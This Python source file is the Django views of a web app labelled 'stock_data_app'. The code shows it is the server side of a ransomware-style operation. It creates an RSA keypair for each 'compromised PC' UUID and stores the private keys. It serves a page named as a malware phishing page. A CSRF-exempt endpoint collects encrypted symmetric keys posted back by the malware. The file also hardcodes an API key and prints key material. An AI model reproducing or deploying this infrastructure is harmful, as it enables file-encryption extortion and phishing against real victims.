# stock_data_app/views.py
# from django.shortcuts import render
from django.http import HttpResponseRedirect, JsonResponse, HttpResponseNotFound
from django.shortcuts import render, redirect
from django.urls import reverse
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from django.views.decorators.csrf import csrf_exempt
from base64 import b64encode
from json import loads
import uuid
from .models import Keys
import secrets

def generate_keypair(request):
    if request.method == 'GET':
        if request.headers['api-key'] == 'secretkey':
            secrets_generator = secrets.SystemRandom()
            secret_key_symetric = secrets.token_urlsafe(128)
            print(secret_key_symetric)
            private_key = rsa.generate_private_key(
                    public_exponent=65537,
                    key_size=2048
                )
            unencrypted_pem_private_key = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
            )
            pem_public_key = private_key.public_key().public_bytes(

                    encoding=serialization.Encoding.PEM,

                    format=serialization.PublicFormat.SubjectPublicKeyInfo

            )
            unencrypted_pem_private_key = unencrypted_pem_private_key
            pem_public_key = pem_public_key
            uuid_number = str(uuid.uuid4())
            key_store = Keys.objects.create(private_key=unencrypted_pem_private_key, public_key=pem_public_key, uuid_compromised_pc=uuid_number)
            key_store.save()
            ## Encrypt
            rsa_key = RSA.importKey(pem_public_key)
            cipher = PKCS1_OAEP.new(rsa_key)
            cipher_encrypt_key = cipher.encrypt(secret_key_symetric.encode(encoding="utf-8") )
            print(b64encode(cipher_encrypt_key).decode('utf8'))
            # Decrypt
            rsa_key = RSA.importKey(unencrypted_pem_private_key)
            cipher = PKCS1_OAEP.new(rsa_key)
            cipher_decrypt_key = cipher.decrypt(cipher_encrypt_key)
            print(cipher_decrypt_key)
            response = {"public_key" : pem_public_key.decode(encoding='utf-8'), "uuid": uuid_number}
            return JsonResponse(response)
    return HttpResponseNotFound("Not Found")

def serve_malware_page_phishing(request):
    
    return render(request, "phishing/templates/phishing.html")

@csrf_exempt
def receive_json_from_malware(request):
    if request.method == 'POST':
        try:
            json_body = loads(request.body)
            print(json_body['uuid'], json_body['key'])
            
            key_update = Keys.objects.get(uuid_compromised_pc=json_body['uuid'])
            key_update.encrypted_symetric_key = json_body['key'].encode(encoding='utf-8')
            key_update.save(update_fields=['encrypted_symetric_key'])
            
            return JsonResponse({"status": "ok"})
        except:
            raise
            return HttpResponseNotFound('Not Found')
    return HttpResponseNotFound('Not Found')

        
        
    

def home(request):
    return render(request, 'home.html')